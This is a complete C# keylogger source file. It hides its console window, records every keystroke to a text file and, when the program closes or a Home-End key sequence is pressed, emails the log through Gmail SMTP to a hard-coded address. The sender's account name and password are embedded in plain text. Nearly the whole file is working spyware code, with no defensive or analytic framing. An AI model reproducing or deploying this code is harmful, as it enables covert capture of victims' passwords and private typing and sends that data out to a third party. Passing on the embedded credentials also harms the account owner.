using System;
using System.Net.Mail; // include reference
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
namespace KeyLogger
{
    class KeyLoggerClass
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

        public static string filename = "3a277973-20e1-4549-9c9e-3f5ffa32c43c.txt"; // generated guid.newGuid()
        public static System.IO.StreamWriter myFile = null;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;

        public static void Email_Send() // send mail from icanmakeyoucryo.o@gmail.com to d1mnewz@gmail.com
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("icanmakeyoucryo.o@gmail.com");
            mail.To.Add("d1mnewz@gmail.com");
            mail.Subject = "spy is real";
            mail.Body = "keylogger via c sharp";

            System.Net.Mail.Attachment attachment;
            attachment = new System.Net.Mail.Attachment(filename);
            mail.Attachments.Add(attachment);

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("icanmakeyoucryo.o@gmail.com", "arizonaboys");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }

        private delegate bool ConsoleEventDelegate(int eventType);

        static bool ConsoleEventCallback(int eventType)
        {
            if (eventType == 2)
            {
                myFile.Close();
                KeyLoggerClass.Email_Send();
                return true;
            }
            return false;
        } // when console closes

        static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected

        static void HideWindow()
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE);
            // Show
            //ShowWindow(handle, SW_SHOW);
        }
        static void Main(string[] args)
        {
            HideWindow();
            handler = new ConsoleEventDelegate(ConsoleEventCallback); // subscribe onclose event to ConsoleEventCallback
            SetConsoleCtrlHandler(handler, true);
            if (System.IO.File.Exists(filename))
            {
                System.IO.File.Delete(filename);
            }
            myFile  = new System.IO.StreamWriter(filename);
            myFile.WriteLineAsync(DateTime.Now.ToString());
            StartLogging();
        }

   
    
        static void StartLogging()
        {
            int lastKey = 0;
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        switch (i)
                        {
                            case 32:
                                myFile.WriteAsync(" ");
                                break;
                            case 13:
                                myFile.WriteLineAsync(myFile.NewLine);
                                break;
                            case 35:
                                if (lastKey == 36)
                                {
                                    ConsoleEventCallback(2); // exit event code 
                                    Environment.Exit(0);
                                }
                                else 
                                     myFile.WriteAsync(((Keys)i).ToString());
                                break;
                            default:
                                myFile.WriteAsync(((Keys)i).ToString());
                                Console.WriteLine(i);
                                break;
                        }
                        lastKey = i;
                    }
                }
            }
            
        }
    }
}